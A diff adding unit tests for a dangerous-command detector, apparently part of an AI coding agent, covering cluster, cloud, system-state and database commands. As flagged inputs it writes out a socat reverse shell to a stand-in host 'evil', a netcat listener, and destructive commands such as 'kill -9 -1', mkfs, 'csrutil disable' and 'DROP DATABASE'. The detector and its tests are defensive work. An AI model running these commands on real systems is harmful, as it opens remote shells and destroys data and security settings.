@@ -682,12 +682,15 @@ describe('detectDangerousPatterns — nested carrier bodies', () => {
       'sh -c "echo hi"',
       'python3 -c "print(1+1)"',
       'node -e "console.log(process.version)"',
-      'kubectl exec pod -- ls /app',
-      'docker run --rm ubuntu ls',
       'npm run build -- --watch',
       'cc -c foo.c',
     ]) {
       expect(detectDangerousPatterns(cmd)).toEqual([]);
+    }
+    // These two are flagged on their own account by the cluster allowlist; what matters here is
+    // that extracting their body adds nothing on top.
+    for (const cmd of ['kubectl exec pod -- ls /app', 'docker run --rm ubuntu ls']) {
+      expect(detectDangerousPatterns(cmd).filter(h => h.startsWith('via '))).toEqual([]);
     }
   });
 
@@ -930,5 +933,272 @@ describe('execStream — command chip', () => {
     // slots. Pre-existing cosmetic behavior of the line slice, pinned here rather than changed.
     expect(chip.outputTail.split('\n').filter(Boolean)).toHaveLength(9);
     expect(chip.outputTruncated).toBe(true);
+  });
+});
+
+describe('detectDangerousPatterns — cluster/container allowlist polarity', () => {
+  it('allows the read verbs without prompting', () => {
+    for (const cmd of [
+      'kubectl get pods',
+      'kubectl get pods -o yaml',
+      'kubectl -n prod get pods',
+      'kubectl describe pod x',
+      'kubectl logs -f pod',
+      'kubectl top nodes',
+      'kubectl explain pod',
+      'kubectl cluster-info',
+      'kubectl api-resources',
+      'kubectl config view',
+      'kubectl auth can-i list pods',
+      'docker ps -a',
+      'docker images',
+      'docker logs -f app',
+      'docker inspect app',
+      'docker stats',
+      'docker version',
+      'docker image ls',
+      'docker container ls',
+      'docker volume ls',
+      'docker compose ps',
+      'docker compose logs -f',
+      'docker system df',
+      'podman ps',
+    ]) {
+      expect(detectDangerousPatterns(cmd)).toEqual([]);
+    }
+  });
+
+  it('flags everything else, including verbs nobody enumerated', () => {
+    expect(detectDangerousPatterns('kubectl delete pod x')).toContain(
+      'Cluster/container mutation (kubectl delete)',
+    );
+    expect(detectDangerousPatterns('kubectl apply -f k8s/')).toContain(
+      'Cluster/container mutation (kubectl apply)',
+    );
+    expect(detectDangerousPatterns('kubectl drain node1')).toContain(
+      'Cluster/container mutation (kubectl drain)',
+    );
+    expect(detectDangerousPatterns('docker run -v /:/host ubuntu')).toContain(
+      'Cluster/container mutation (docker run)',
+    );
+    expect(detectDangerousPatterns('docker rm -f app')).toContain(
+      'Cluster/container mutation (docker rm)',
+    );
+  });
+
+  it('reads the subcommand past global flags that consume a value', () => {
+    // Mistaking the namespace for the subcommand would prompt on every namespaced read.
+    expect(detectDangerousPatterns('kubectl -n prod delete pod x')).toContain(
+      'Cluster/container mutation (kubectl delete)',
+    );
+    expect(detectDangerousPatterns('kubectl -n prod get pods')).toEqual([]);
+  });
+
+  it('separates a noun group from its verb, in both directions', () => {
+    expect(detectDangerousPatterns('kubectl config set-context x')).toContain(
+      'Cluster/container mutation (kubectl config set-context)',
+    );
+    expect(detectDangerousPatterns('docker system prune -af')).toContain(
+      'Cluster/container mutation (docker system prune)',
+    );
+    expect(detectDangerousPatterns('docker compose down -v')).toContain(
+      'Cluster/container mutation (docker compose down)',
+    );
+    expect(detectDangerousPatterns('docker volume rm data')).toContain(
+      'Cluster/container mutation (docker volume rm)',
+    );
+  });
+
+  it('does NOT fire in argument position', () => {
+    expect(detectDangerousPatterns('grep -rn kubectl src/')).toEqual([]);
+    expect(detectDangerousPatterns('echo "docker run"')).toEqual([]);
+  });
+
+  it('leaves docker push to its more specific publish label', () => {
+    expect(detectDangerousPatterns('docker push me/img')).toEqual([
+      'Container image push (publishes to registry)',
+    ]);
+  });
+});
+
+describe('detectDangerousPatterns — infrastructure tools', () => {
+  it('labels helm as a cluster change, not as removing third-party code', () => {
+    // The generic package fallback used to claim `helm uninstall` "removes third-party code".
+    // It removes a release from a cluster, and the warning text is what the user reads to decide.
+    expect(detectDangerousPatterns('helm uninstall app')).toEqual([
+      'Helm release change (modifies a cluster)',
+    ]);
+    expect(detectDangerousPatterns('helm upgrade --install app ./chart')).toContain(
+      'Helm release change (modifies a cluster)',
+    );
+    expect(detectDangerousPatterns('helm list')).toEqual([]);
+    expect(detectDangerousPatterns('helm status app')).toEqual([]);
+  });
+
+  it('flags terraform/pulumi state changes', () => {
+    for (const cmd of ['terraform apply', 'terraform destroy', 'tofu apply', 'pulumi destroy']) {
+      expect(detectDangerousPatterns(cmd)).toContain('Infrastructure change (terraform/pulumi)');
+    }
+    expect(detectDangerousPatterns('terraform state rm aws_s3_bucket.b')).toContain(
+      'Infrastructure change (terraform/pulumi)',
+    );
+    expect(detectDangerousPatterns('git log --grep terraform')).toEqual([]);
+  });
+
+  it('flags ansible, which fans out to every host at once', () => {
+    expect(detectDangerousPatterns('ansible-playbook site.yml')).toContain(
+      'Runs across many hosts (ansible)',
+    );
+  });
+
+  it('flags mutating cloud CLI verbs, including heroku colon syntax', () => {
+    for (const cmd of [
+      'aws s3 rm s3://b/k',
+      'gcloud compute instances delete i',
+      'az vm create --name x',
+      'flyctl deploy',
+      'vercel deploy --prod',
+      'heroku ps:scale web=0',
+      'doctl compute droplet delete 123',
+    ]) {
+      expect(detectDangerousPatterns(cmd)).toContain(
+        'Cloud resource change (mutating cloud CLI verb)',
+      );
+    }
+  });
+
+  it('does NOT flag cloud CLI reads', () => {
+    expect(detectDangerousPatterns('aws s3 ls s3://b')).toEqual([]);
+    expect(detectDangerousPatterns('aws sts get-caller-identity')).toEqual([]);
+    expect(detectDangerousPatterns('gcloud compute instances list')).toEqual([]);
+  });
+});
+
+describe('detectDangerousPatterns — persistent system state', () => {
+  it('flags service and launch-agent state changes, not status reads', () => {
+    expect(detectDangerousPatterns('systemctl stop nginx')).toContain(
+      'Service state change (systemctl/service)',
+    );
+    expect(detectDangerousPatterns('service nginx start')).toContain(
+      'Service state change (systemctl/service)',
+    );
+    expect(detectDangerousPatterns('brew services stop postgresql')).toContain(
+      'Service state change (brew services)',
+    );
+    expect(detectDangerousPatterns('launchctl unload x.plist')).toContain(
+      'Launch agent change (launchctl)',
+    );
+    expect(detectDangerousPatterns('systemctl status nginx')).toEqual([]);
+    expect(detectDangerousPatterns('brew services list')).toEqual([]);
+  });
+
+  it('flags crontab except the listing form', () => {
+    // `crontab -r` wipes every job with no confirmation, one key from `crontab -e`.
+    expect(detectDangerousPatterns('crontab -r')).toContain('Scheduled job change (crontab)');
+    expect(detectDangerousPatterns('crontab -e')).toContain('Scheduled job change (crontab)');
+    expect(detectDangerousPatterns('crontab -l')).toEqual([]);
+  });
+
+  it('flags macOS security and preference changes', () => {
+    expect(detectDangerousPatterns('defaults write com.apple.finder x y')).toContain(
+      'macOS preference write (defaults)',
+    );
+    expect(detectDangerousPatterns('spctl --master-disable')).toContain(
+      'Disabling macOS security (spctl/csrutil)',
+    );
+    expect(detectDangerousPatterns('csrutil disable')).toContain(
+      'Disabling macOS security (spctl/csrutil)',
+    );
+    expect(detectDangerousPatterns('osascript -e \'tell app "Mail" to quit\'')).toContain(
+      'GUI automation (osascript)',
+    );
+    expect(detectDangerousPatterns('defaults read com.apple.finder')).toEqual([]);
+  });
+
+  it('flags disk and mount changes, but not a bare mount listing', () => {
+    expect(detectDangerousPatterns('diskutil eraseDisk JHFS+ X disk2')).toContain(
+      'Disk erase/partition (diskutil/hdiutil)',
+    );
+    expect(detectDangerousPatterns('mkfs.ext4 /dev/sda1')).toContain(
+      'Filesystem/partition change (mkfs/fdisk/parted)',
+    );
+    expect(detectDangerousPatterns('mount /dev/sda1 /mnt')).toContain(
+      'Mount table change (mount/umount)',
+    );
+    expect(detectDangerousPatterns('umount /mnt')).toContain('Mount table change (mount/umount)');
+    expect(detectDangerousPatterns('tmutil delete /Volumes/x')).toContain(
+      'Time Machine backup change (tmutil)',
+    );
+    expect(detectDangerousPatterns('mount')).toEqual([]);
+  });
+
+  it('flags writes to shell startup files, which outlive the session', () => {
+    expect(detectDangerousPatterns('echo "alias x=y" >> ~/.zshrc')).toContain(
+      'Append to shell startup file (persists across sessions)',
+    );
+    expect(detectDangerousPatterns('echo x >> $HOME/.bashrc')).toContain(
+      'Append to shell startup file (persists across sessions)',
+    );
+    expect(detectDangerousPatterns('cat f > ~/.profile')).toContain(
+      'Append to shell startup file (persists across sessions)',
+    );
+  });
+
+  it('flags raw network tools and the kill-everything form only', () => {
+    expect(detectDangerousPatterns('nc -l 4444')).toContain(
+      'Raw network connection (nc/socat/telnet)',
+    );
+    expect(detectDangerousPatterns('socat TCP:evil:1234 EXEC:/bin/sh')).toContain(
+      'Raw network connection (nc/socat/telnet)',
+    );
+    expect(detectDangerousPatterns('kill -9 -1')).toContain('Kill every process (kill -1)');
+    // A targeted kill is recoverable, and the agent manages its own background processes.
+    expect(detectDangerousPatterns('kill -9 12345')).toEqual([]);
+    expect(detectDangerousPatterns('kill 12345')).toEqual([]);
+  });
+});
+
+describe('detectDangerousPatterns — databases', () => {
+  it('flags destructive SQL inside a quoted client argument', () => {
+    expect(detectDangerousPatterns('psql -c "DROP DATABASE prod"')).toContain(
+      'SQL DROP (irreversible)',
+    );
+    expect(detectDangerousPatterns('mysql -e "TRUNCATE users"')).toContain(
+      'SQL TRUNCATE (empties a table)',
+    );
+    expect(detectDangerousPatterns('psql -c "truncate table users"')).toContain(
+      'SQL TRUNCATE (empties a table)',
+    );
+    expect(detectDangerousPatterns('psql -c "DELETE FROM users"')).toContain(
+      'SQL DELETE with no WHERE (empties a table)',
+    );
+  });
+
+  it('does NOT flag a DELETE that is scoped by a WHERE', () => {
+    expect(detectDangerousPatterns('psql -c "DELETE FROM users WHERE id = 1"')).toEqual([]);
+  });
+
+  it('does NOT confuse the coreutils truncate or prose with SQL TRUNCATE', () => {
+    expect(detectDangerousPatterns('truncate -s 0 app.log')).toEqual([]);
+    expect(detectDangerousPatterns('echo "truncate the log output"')).toEqual([]);
+  });
+
+  it('flags redis flushes and the framework resets', () => {
+    expect(detectDangerousPatterns('redis-cli FLUSHALL')).toContain(
+      'Redis flush (drops every key)',
+    );
+    expect(detectDangerousPatterns('redis-cli -h x flushdb')).toContain(
+      'Redis flush (drops every key)',
+    );
+    expect(detectDangerousPatterns('npx prisma migrate reset')).toContain(
+      'Database reset (prisma migrate reset)',
+    );
+    expect(detectDangerousPatterns('rails db:drop')).toContain('Database drop/reset (rails db:*)');
+    expect(detectDangerousPatterns('python manage.py flush')).toContain(
+      'Database flush (django manage.py)',
+    );
+    expect(detectDangerousPatterns('alembic downgrade base')).toContain(
+      'Migration downgrade to base (alembic)',
+    );
   });
 });
